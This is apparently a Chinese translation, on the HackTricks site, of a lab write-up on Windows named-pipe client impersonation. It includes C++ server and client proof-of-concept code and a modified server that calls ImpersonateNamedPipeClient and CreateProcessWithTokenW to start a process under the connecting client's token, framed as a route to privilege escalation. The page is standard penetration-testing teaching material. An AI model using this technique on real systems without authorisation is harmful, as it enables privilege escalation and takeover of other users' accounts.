# 命名管道客户端模拟

## 命名管道客户端模拟

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

**此信息是从**[**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation) **复制的**

## 概述

`pipe`是一块用于进程间通信和数据交换的共享内存块。

`命名管道`是Windows的一种机制，它使得两个不相关的进程可以在彼此之间交换数据，即使这些进程位于两个不同的网络上。它非常类似于客户端/服务器架构，因为存在`命名管道服务器`和`命名管道客户端`的概念。

命名管道服务器可以使用一些预定义的名称打开一个命名管道，然后命名管道客户端可以通过已知的名称连接到该管道。一旦建立连接，数据交换就可以开始了。

本实验涉及一个简单的PoC代码，可以实现以下功能：

* 创建一个单线程的简单命名管道服务器，它将接受一个客户端连接
* 命名管道服务器向命名管道写入一条简单的消息，以便管道客户端可以读取它

## 代码

以下是服务器和客户端的PoC代码：

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // Connect to the named pipe
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to connect to the named pipe. Error code: %d\n", GetLastError());
        return 1;
    }

    // Send a message to the server
    const char* message = "Hello from the client!";
    if (!WriteFile(hPipe, message, strlen(message) + 1, &dwBytesRead, NULL))
    {
        printf("Failed to send message to the server. Error code: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // Receive a response from the server
    if (!ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("Failed to receive response from the server. Error code: %d\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("Response from the server: %s\n", buffer);

    // Close the named pipe
    CloseHandle(hPipe);

    return 0;
}
```

{% endtab %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## 执行

下面展示了命名管道服务器和命名管道客户端正常工作的情况：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

值得注意的是，默认情况下，命名管道通信使用SMB协议：

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

检查进程如何保持对我们的命名管道`mantvydas-first-pipe`的句柄：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

类似地，我们可以看到客户端对命名管道有一个打开的句柄：

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

我们甚至可以用powershell看到我们的管道：
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## 令牌冒充

{% hint style="info" %}
请注意，为了冒充客户端进程的令牌，您需要拥有（创建管道的服务器进程）**`SeImpersonate`** 令牌特权。
{% endhint %}

通过利用`ImpersonateNamedPipeClient` API调用，命名管道服务器可以冒充命名管道客户端的安全上下文，从而将命名管道服务器当前线程的令牌更改为命名管道客户端的令牌。

我们可以像下面这样更新命名管道服务器的代码以实现冒充 - 请注意，修改在第25行及以下可见：
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
运行服务器并使用以administrator@offense.local安全上下文运行的客户端连接到它，我们可以看到命名服务器管道的主线程假定了命名管道客户端的令牌 - offense\administrator，尽管PipeServer.exe本身是在ws01\mantvydas安全上下文下运行的。听起来是提升权限的好方法吗？

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
